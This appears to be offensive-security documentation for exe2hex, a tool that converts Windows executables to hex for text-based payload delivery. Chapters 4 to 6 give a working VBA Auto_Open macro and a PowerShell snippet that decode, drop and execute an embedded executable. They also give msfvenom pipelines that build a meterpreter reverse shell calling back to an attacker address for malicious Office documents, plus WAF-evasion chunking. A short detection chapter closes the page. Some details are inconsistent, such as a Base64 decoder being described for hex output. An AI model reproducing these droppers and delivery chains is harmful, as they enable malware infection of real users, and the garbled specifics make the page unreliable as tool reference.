---
title: "exe2hex"
tool_name: "exe2hex"
category: "Shellcode & Payload"
phase: "02 - Resource Development"
difficulty: "Beginner"
platform: "Linux (cross-platform output)"
language: "Python"
license: "MIT"
repository: "https://github.com/g0tm1k/exe2hex"
kali_package: "exe2hex"
mitre_attack:
  tactic: "resource-development"
  technique_id: "TA0042"
  technique_name: "Resource Development"
  sub_technique: "shellcode_payload"
tags:
  - "exe-conversion"
  - "hex-array"
  - "payload-delivery"
date_created: "2015-01-01"
last_updated: "2020-01-01"
author: "g0tm1k"
---

# exe2hex — Comprehensive Documentation

---

## Chapter 1: Introduction & Overview

exe2hex converts Windows executables (PE files) into hex array representations that can be embedded directly in code, scripts, or transmitted through protocols that don't support binary data. This conversion is essential for payload delivery when direct binary transfer is restricted.

### Why Convert EXE to Hex?

Many attack vectors cannot transmit raw binary files:
- **Clipboard**: Copy-paste doesn't preserve binary data
- **Script injection**: VBScript and PowerShell macros handle text more naturally
- **Web application exploits**: POST data and URL parameters are text-based
- **Protocol restrictions**: Some protocols strip or corrupt binary bytes
- **WAF bypass**: Hex encoding may bypass content inspection

### Core Functionality

- Convert PE files to hex byte arrays
- Output in multiple formats (C array, Python, VBScript, PowerShell)
- Preserve PE structure in the hex representation
- Handle large files with chunked output

---

## Chapter 2: Installation & Setup

### Kali Linux

```bash
sudo apt update && sudo apt install exe2hex
```

**Explanation:** Installs exe2hex from the Kali repository.

### From Source

```bash
git clone https://github.com/g0tm1k/exe2hex.git
cd exe2hex
chmod +x exe2hex.py
```

**Explanation:** Clones the repository and makes the script executable.

### Dependencies

exe2hex requires only Python — no additional packages needed.

```bash
python3 exe2hex.py -h
```

---

## Chapter 3: Basic Usage

### Converting an EXE to Hex

```bash
python3 exe2hex.py -x payload.exe -o payload.hex
```

**Explanation:** Converts payload.exe to a hex string representation and saves it to payload.hex.

### Converting to C Array Format

```bash
python3 exe2hex.py -x payload.exe -c -o payload_array.c
```

**Explanation:** Outputs the PE file as a C byte array, ready to embed in C/C++ source code.

### Converting to VBA Macro Format

```bash
python3 exe2hex.py -x payload.exe -v -o macro.txt
```

**Explanation:** Generates a VBA-compatible hex string for embedding in Office macros.

### Converting to PowerShell Format

```bash
python3 exe2hex.py -x payload.exe -p -o powershell_hex.txt
```

**Explanation:** Outputs the PE as a PowerShell-compatible byte array for in-memory execution via `[System.Convert]::FromBase64String()`.

### Converting to Python Format

```bash
python3 exe2hex.py -x payload.exe --python -o payload_hex.py
```

**Explanation:** Generates a Python byte string representation of the executable.

### Complete Flags Reference

| Flag | Description |
|------|-------------|
| **-x** | Input EXE/PE file to convert |
| **-o** | Output file path |
| **-c** | Output in C array format |
| **-v** | Output in VBA macro format |
| **-p** | Output in PowerShell format |
| **--python** | Output in Python byte string format |
| **-h** | Display help |

---

## Chapter 4: Intermediate Usage

### Payload Delivery via Clipboard

```bash
# Generate hex for clipboard injection
python3 exe2hex.py -x shell.exe -v -o clipboard.txt
# Copy contents to clipboard
xclip -selection clipboard < clipboard.txt
# Paste into target VBA editor
```

**Explanation:** The hex-encoded payload can be pasted into a VBA editor, which then decodes and executes it at runtime.

### Integration with MSFvenom

```bash
# Generate payload
msfvenom -p windows/exec CMD="calc.exe" -f exe -o calc.exe

# Convert to hex for script-based delivery
python3 exe2hex.py -x calc.exe -p -o calc_hex.ps1
```

**Explanation:** Combines MSFvenom's payload generation with exe2hex's conversion for script-based delivery mechanisms.

### Batch Conversion

```bash
#!/bin/bash
# Convert multiple payloads for different delivery methods
for f in *.exe; do
    python3 exe2hex.py -x "$f" -c -o "${f%.exe}_c_array.txt"
    python3 exe2hex.py -x "$f" -p -o "${f%.exe}_ps_hex.txt"
    python3 exe2hex.py -x "$f" -v -o "${f%.exe}_vba_hex.txt"
done
```

**Explanation:** Batch conversion creates multiple output formats for each payload, enabling different delivery mechanisms.

---

## Chapter 5: Advanced Usage

### WAF Bypass Techniques

Hex encoding can bypass basic content inspection:

```bash
# Split hex output into chunks
python3 exe2hex.py -x payload.exe -p | fold -w 1024 > chunks.txt

# Each chunk can be transmitted separately and reassembled
```

**Explanation:** Chunked hex output enables transmission through channels with size limits or that split payloads across multiple requests.

### Payload Assembly in PowerShell

```powershell
# Decode hex-encoded payload
$hex = "4D5A90000300..."  # From exe2hex output
$bytes = [System.Convert]::FromHexString($hex)
[System.IO.File]::WriteAllBytes("C:\temp\payload.exe", $bytes)
Start-Process "C:\temp\payload.exe"
```

**Explanation:** The hex-encoded payload is decoded and written to disk, then executed — all through PowerShell without downloading files.

### Multi-Stage Delivery with Hex Arrays

```bash
# Generate hex arrays for a staged payload
# Stage 1: Small stager
python3 exe2hex.py -x stager.exe -c -o stager_array.c

# Stage 2: Full payload (decoded at runtime)
python3 exe2hex.py -x full_payload.exe -p -o full_hex.txt

# The C array is compiled into the stager
# The full payload is decoded from hex at runtime
```

**Explanation:** Hex arrays enable staged delivery where a small compiled program decodes and executes a larger hex-encoded payload.

### Hex Encoding in VBA for Document-Based Attacks

```vba
' VBA macro that decodes hex-encoded payload
Sub Auto_Open()
    Dim hexStr As String
    hexStr = "4D5A90000300000004000000FFFF..."  ' From exe2hex
    Dim bytes() As Byte
    ReDim bytes(Len(hexStr) \ 2 - 1)
    Dim i As Long
    For i = 0 To UBound(bytes)
        bytes(i) = CByte("&H" & Mid(hexStr, i * 2 + 1, 2))
    Next i
    ' Write bytes to file and execute
    Open "C:\temp\payload.exe" For Binary As #1
    Put #1, , bytes
    Close #1
    Shell "C:\temp\payload.exe", vbNormalFocus
End Sub
```

**Explanation:** VBA macros can decode hex-encoded payloads byte-by-byte, creating a self-contained delivery mechanism within Office documents.

### Binary Diffing with Hex Output

```bash
# Compare original and infected PE as hex
python3 exe2hex.py -x original.exe -o original.hex
python3 exe2hex.py -x infected.exe -o infected.hex
diff original.hex infected.hex
```

**Explanation:** Hex comparison reveals exactly which bytes changed during infection — useful for understanding what Shellter or BDF modified.

### Automated Payload Pipeline

```bash
#!/bin/bash
# Complete pipeline: generate → convert → deliver
LHOST="192.168.1.100"
LPORT="4444"

# Generate payload
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT \
  -f exe -o /tmp/payload.exe

# Convert to VBA hex for document delivery
python3 exe2hex.py -x /tmp/payload.exe -v -o /tmp/macro.txt

# Convert to PowerShell for script delivery
python3 exe2hex.py -x /tmp/payload.exe -p -o /tmp/stager.ps1

# Convert to C for compiled loader
python3 exe2hex.py -x /tmp/payload.exe -c -o /tmp/loader.c

echo "[+] Generated all delivery formats"
```

**Explanation:** Automated pipeline produces multiple delivery formats from a single payload, enabling flexible deployment strategies.

---

## Chapter 6: Real-World Scenarios

### Scenario 1: VBScript Payload Delivery

A web application allowed VBA macro execution but blocked file uploads. The payload needed to be embedded in the macro itself:

```bash
# Convert payload to VBA-compatible hex
python3 exe2hex.py -x backdoor.exe -v -o macro_payload.txt
```

**Explanation:** The hex-encoded payload is embedded in a VBA macro that decodes and executes it when the macro runs.

### Scenario 2: CTF Binary Transfer

A CTF challenge required transferring a binary to a target with no file transfer capability, only text-based input:

```bash
# Convert to C array for pasting into a C program on the target
python3 exe2hex.py -x tool.exe -c -o tool_hex.txt

# Or convert to PowerShell for command-line transfer
python3 exe2hex.py -x tool.exe -p -o tool_ps.txt
```

**Explanation:** Hex encoding enables binary transfer through text-only channels by converting bytes to printable hex characters.

### Scenario 3: Office Macro Penetration Test

During a social engineering assessment, the objective was payload delivery via a malicious Office document:

```bash
# Generate payload
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe

# Convert to VBA hex
python3 exe2hex.py -x payload.exe -v -o macro.txt

# Embed in Office document VBA macro
```

**Explanation:** The hex-encoded payload is embedded in an Auto_Open macro, executing when the user enables macros in the document.

---

## Chapter 7: Detection & Defense

### Indicators

- VBA macros containing large hex strings
- PowerShell scripts with Base64 or hex-encoded executables
- Unusually long string literals in scripts
- Script execution spawning child processes

### Detection Rules

```yara
rule EXE2Hex_VBA_Payload {
    meta:
        description = "Detects hex-encoded PE in VBA macro"
    strings:
        $vba1 = "StrConv(\"" nocase
        $hex_header = "4D5A90" // MZ header in hex
    condition:
        $vba1 and $hex_header
}
```

**Explanation:** YARA rule detects VBA macros containing hex-encoded MZ (PE header) signatures.

### Defensive Measures

1. **Disable macros** by default in Office applications
2. **Enable AMSI** for PowerShell execution monitoring
3. **Monitor** for large string operations in scripts
4. **Block** unsigned macro execution via GPO

---

## Chapter 8: Troubleshooting

### "File not a valid PE" Error

**Cause:** Input file is not a valid Windows PE executable.

```bash
# Verify file type
file target.exe
# Should show: PE32 executable (GUI) Intel 80386
```

**Explanation:** exe2hex requires valid PE files. Verify the input is a Windows executable, not a Linux ELF or other format.

### Output Too Large

**Cause:** The PE file is large and the hex output exceeds paste limits.

```bash
# Use chunked output
python3 exe2hex.py -x large.exe -p | head -c 10000 > chunk1.txt
```

**Explanation:** Large executables produce hex strings that may exceed clipboard or injection limits. Split into chunks for manual reassembly.

---

## Resources

- [exe2hex GitHub](https://github.com/g0tm1k/exe2hex) — Source code
- [Metasploit Framework](https://www.metasploit.com/) — Payload generation
- [VBA Security Best Practices](https://docs.microsoft.com/en-us/deployoffice/security/internet-macros-blocked) — Microsoft macro security

---

*Last updated: July 2026*
